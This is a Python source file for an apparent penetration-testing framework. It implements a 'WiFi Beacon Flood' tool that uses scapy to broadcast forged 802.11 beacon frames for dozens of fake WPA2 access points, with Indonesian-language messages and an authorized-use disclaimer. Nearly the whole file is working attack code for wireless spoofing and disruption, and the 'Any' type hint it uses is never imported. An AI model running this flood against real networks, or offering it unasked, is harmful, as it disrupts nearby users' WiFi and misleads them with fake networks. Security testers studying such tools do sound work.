from aleo_pantest.core.base_tool import BaseTool, ToolMetadata, ToolCategory
import time
import random
import threading
try:
    from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

class BeaconFlood(BaseTool):
    def __init__(self):
        metadata = ToolMetadata(
            name="WiFi Beacon Flood",
            category=ToolCategory.WIRELESS,
            version="3.3.0",
            author="AleoPantest",
            description="Membuat ribuan SSID palsu untuk membingungkan pemindaian WiFi (Membutuhkan interface monitor mode)",
            usage="aleopantest run beacon-flood --iface wlan0mon --count 100",
            example="aleopantest run beacon-flood --iface wlan0mon --prefix 'GHOST_' --count 50",
            requirements=["scapy", "monitor-mode interface"],
            tags=["wireless", "wifi", "flood", "high-risk"],
            risk_level="HIGH",
            legal_disclaimer="Gunakan hanya untuk pengujian penetrasi resmi pada infrastruktur yang Anda miliki.",
            form_schema=[
                {
                    "name": "iface",
                    "label": "Interface (Monitor Mode)",
                    "type": "text",
                    "default": "wlan0mon",
                    "required": True
                },
                {
                    "name": "prefix",
                    "label": "SSID Prefix",
                    "type": "text",
                    "default": "ALEO_GHOST_",
                    "required": False
                },
                {
                    "name": "count",
                    "label": "Number of APs",
                    "type": "number",
                    "default": 50,
                    "required": True
                },
                {
                    "name": "duration",
                    "label": "Duration (seconds, max 3600)",
                    "type": "number",
                    "default": 60,
                    "required": True
                }
            ]
        )
        super().__init__(metadata)

    def run(self, iface: str = "wlan0mon", prefix: str = "ALEO_GHOST_", count: Any = 50, duration: Any = 60, **kwargs):
        self.start_time = time.time()
        
        # Ensure count and duration are integers
        try:
            count = int(count)
            duration = int(duration)
        except (ValueError, TypeError):
            self.add_error(f"Invalid parameters: count ({count}) and duration ({duration}) must be integers.")
            return self.get_results()

        # 1. Safety Check
        if not self.check_safety(duration):
            return self.get_results()

        self.audit_log(f"Starting Beacon Flood on {iface} with {count} APs for {duration}s")
        
        if not HAS_SCAPY:
            self.add_error("Library 'scapy' tidak ditemukan. Silakan jalankan: pip install scapy")
            return self.get_results()

        self.add_result(f"[*] Inisialisasi Beacon Flood pada interface {iface}")
        self.add_result(f"[*] Membuat {count} Access Points palsu dengan prefix '{prefix}'")
        
        stop_event = threading.Event()
        
        def flood_worker():
            ssids = [f"{prefix}{random.randint(1000, 9999)}" for _ in range(count)]
            addresses = [f"00:{random.randint(10,99)}:{random.randint(10,99)}:{random.randint(10,99)}:{random.randint(10,99)}:{random.randint(10,99)}" for _ in range(count)]
            
            start = time.time()
            while not stop_event.is_set() and (time.time() - start < duration):
                for i in range(count):
                    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=addresses[i], addr3=addresses[i])
                    beacon = Dot11Beacon(cap='ESS+privacy')
                    essid = Dot11Elt(ID='SSID', info=ssids[i], len=len(ssids[i]))
                    rsn = Dot11Elt(ID='RSNinfo', info=(
                        '\x01\x00'                 # RSN Version 1
                        '\x00\x0f\xac\x02'         # Group cipher suite: TKIP
                        '\x02\x00'                 # 2 Pairwise cipher suites
                        '\x00\x0f\xac\x04'         # AES (CCMP)
                        '\x00\x0f\xac\x02'         # TKIP
                        '\x01\x00'                 # 1 AKM suite
                        '\x00\x0f\xac\x02'         # Pre-shared key
                        '\x00\x00'))               # RSN Capabilities (no extra capabilities)
                    
                    frame = RadioTap()/dot11/beacon/essid/rsn
                    try:
                        sendp(frame, iface=iface, verbose=False)
                    except Exception as e:
                        self.add_error(f"Error sending frame: {str(e)}")
                        stop_event.set()
                        break
                time.sleep(0.1)

        worker = threading.Thread(target=flood_worker)
        worker.start()
        
        self.add_result(f"[*] Flooding sedang berjalan... (Maksimal {duration} detik)")
        
        # Wait for duration or stop
        try:
            time.sleep(min(duration, 5)) # Show initial success
            if worker.is_alive():
                self.add_result("[+] Serangan berhasil diluncurkan dan berjalan di background.")
            else:
                self.add_error("Gagal meluncurkan serangan. Pastikan interface dalam monitor mode dan Anda memiliki hak akses root.")
        except KeyboardInterrupt:
            stop_event.set()
            
        return self.get_results()

    def validate_input(self, **kwargs) -> bool:
        if 'duration' in kwargs and int(kwargs['duration']) > 3600:
            return False
        return True
